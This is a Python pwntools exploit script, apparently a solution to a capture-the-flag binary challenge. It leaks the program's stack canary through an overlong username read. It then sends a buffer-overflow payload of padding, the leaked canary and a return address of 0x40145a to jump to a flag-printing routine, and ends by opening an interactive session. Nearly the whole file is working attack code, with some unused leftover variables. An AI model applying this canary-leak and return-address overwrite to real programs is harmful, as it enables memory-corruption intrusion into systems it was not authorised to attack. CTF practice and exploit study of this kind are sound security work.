from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)





# Specify your GDB script here for debugging
gdbscript = '''
source ~/pwndbg/gdbinit.py
b *main

# b *reg
canary
continue
'''


# Set up pwntools for the correct architecture
exe = './binary'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset

# payload = "A"*16

# Build the payload
io = start()
io.sendlineafter(b">",b"2")

io.sendlineafter(b":",b"40")
io.sendlineafter(b":",b"A" * 16)
leak = io.recvline()
data = leak.split(b"Sorry, we couldn't find the user: ")[1]
canary = u64(data[24:32].ljust(8, b"\x00"))
# canary = u64(canary.ljust(8, b"\x00"))

log.success(f'Canary: {hex(canary)}')
login_addr = p64(elf.symbols['login'])
flag_addr = p64(0x7ffe6a83b570) 
write_plt = p64(elf.plt['write'])          # `write()` function
flag_fd = p64(3)                           # Flag file descriptor (FD = 3)
flag_addr = p64(0x7ffe6a83b570)            # Flag address from GDB
flag_len = p64(10)                         # Flag length
flag = 0x0040145a

# puts

payload = flat(
    b"A" * 24,              # Buffer padding
    p64(canary),            # Correct canary value
    b"B"*8 , 
    p64(flag)      
    )


io.sendlineafter(b">",b"1")

# io.sendlineafter(b":",b"100")
# io.sendlineafter(b":","")
io.sendlineafter(b":",payload)


io.interactive()
